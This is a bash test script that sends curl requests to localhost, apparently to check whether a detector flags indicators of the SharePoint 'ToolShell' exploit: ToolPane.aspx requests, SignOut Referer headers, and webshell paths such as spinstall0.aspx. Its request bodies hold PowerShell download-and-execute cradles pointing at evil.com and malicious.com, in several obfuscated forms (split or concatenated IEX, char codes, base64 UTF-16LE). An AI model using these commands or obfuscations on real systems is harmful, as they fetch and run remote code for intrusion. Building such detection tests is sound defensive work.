#!/bin/bash

# Base endpoint
BASE_URL="https://localhost"

# Disable self-signed certificate check
CURL="curl -k -s -o /dev/null -w '%{http_code}\n'"

echo "1. POST exploit ToolShell (IOC: ToolPane, Referer, params, UA)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx" \
  -X POST \
  -H "Referer: /_layouts/SignOut.aspx" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0" \
  --data '<exploit>'

echo "2. GET to webshell endpoint (IOC: Webshell probe)"
$CURL "$BASE_URL/_layouts/15/spinstall0.aspx"

$CURL "$BASE_URL/any/endpoint" -X POST --data 'test'

echo "4. GET favicon (no IOC)"
$CURL "$BASE_URL/favicon.ico"

echo "5. POST with ViewState (IOC: ViewState payload)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST --data '__VIEWSTATE=malicious'

echo "6. POST ToolPane v16 (IOC: ToolPane exploit endpoint)"
$CURL "$BASE_URL/_layouts/16/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx" -X POST --data '<exploit>'

echo "7. GET info3.aspx (IOC: Webshell probe)"
$CURL "$BASE_URL/_layouts/15/info3.aspx"

echo "8. POST with full Referer (IOC: Referer SignOut.aspx)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST -H "Referer: https://localhost/_layouts/SignOut.aspx" --data '<exploit>'

echo "9. POST with only DisplayMode param (IOC: DisplayMode=Edit)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx?DisplayMode=Edit" -X POST --data '<exploit>'

echo "10. POST with only a= param (IOC: a=/ToolPane.aspx)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx?a=/ToolPane.aspx" -X POST --data '<exploit>'

echo "11. GET root (no IOC)"
$CURL "$BASE_URL/"

echo "12. GET spinstall1.aspx (IOC: Webshell probe)"
$CURL "$BASE_URL/_layouts/15/spinstall1.aspx"

echo "13. GET xxx.aspx (IOC: Webshell probe)"
$CURL "$BASE_URL/_layouts/15/xxx.aspx"

echo "14. POST PowerShell IEX (Invoke-Expression)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data 'powershell -Command "IEX(New-Object Net.WebClient).DownloadString(\'http://evil.com/shell.ps1\')"'

echo "15. POST PowerShell IEX offuscato (I\`E\`X)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data 'powershell -Command "I`E`X(New-Object Net.WebClient).DownloadString(\'http://evil.com/shell.ps1\')"'

echo "16. POST base64 puro (senza EncodedCommand)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data 'aW1wb3J0IC1tb2R1bGUgTmV0LldlYkNsaWVudA=='

echo "17. POST PowerShell pattern Invoke-WebRequest"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data "powershell -Command 'Invoke-WebRequest -Uri http://malicious.com -OutFile C:\\mal.exe'"

echo "18. POST PowerShell pattern New-Object Net.WebClient"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data "powershell -Command '(New-Object Net.WebClient).DownloadFile(\'http://malicious.com/file.exe\',\'C:\\file.exe\')'"

echo "19. POST PowerShell IEX concatenato ('I'+'EX')"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data "powershell -Command ('I'+'EX'+' (New-Object Net.WebClient).DownloadString(\'http://evil.com/shell.ps1\')')"

echo "20. POST PowerShell char codes ([char]73+[char]69+[char]88)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data "powershell -Command \"\$b=[char]73+[char]69+[char]88; iex(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""

echo "21. POST PowerShell variabile IEX ( 4a='IEX'; &$a)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data "powershell -Command \"\$a='IEX'; &\$a (New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""

echo "22. POST PowerShell base64 UTF-16LE (aQBlAHgA = iex)"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data 'YQBlAHgA'

echo "23. POST PowerShell via cmd.exe wrapper"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data "cmd.exe /c powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://evil.com/shell.ps1')\""

echo "24. POST PowerShell pipeline (IEX (Get-Content ...))"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data "powershell -Command \"IEX (Get-Content C:\\temp\\payload.ps1)\""

echo "25. POST PowerShell Invoke-Obfuscation artifact"
$CURL "$BASE_URL/_layouts/15/ToolPane.aspx" -X POST \
  -H "Content-Type: text/plain" \
  --data "powershell -Command \"&([scriptblock]::Create((('JABXAGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvAGUAdgBpAGwALgBjAG8AbQAvAHMAaABlAGwAbAAuAHAAcwAxACcAKQA=')))\""